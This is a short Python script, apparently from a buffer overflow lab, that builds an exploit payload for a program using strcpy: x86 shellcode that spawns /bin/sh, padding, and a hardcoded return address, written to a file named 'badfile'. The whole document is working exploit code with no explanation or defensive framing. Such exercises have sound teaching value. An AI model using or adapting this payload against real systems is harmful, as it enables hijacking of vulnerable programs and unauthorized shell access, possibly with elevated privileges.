import struct 

#strcpy copies up to the '\0' string terminator

shellcode= "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"

buffer1 = 0xbffff134

atk_vector = shellcode
atk_vector += '\0'
atk_vector += 'A'*(120 - len(atk_vector))
atk_vector += 'A'*8
atk_vector += struct.pack('I', buffer1)

f = open('badfile', 'w+')
f.write(atk_vector)
f.close()
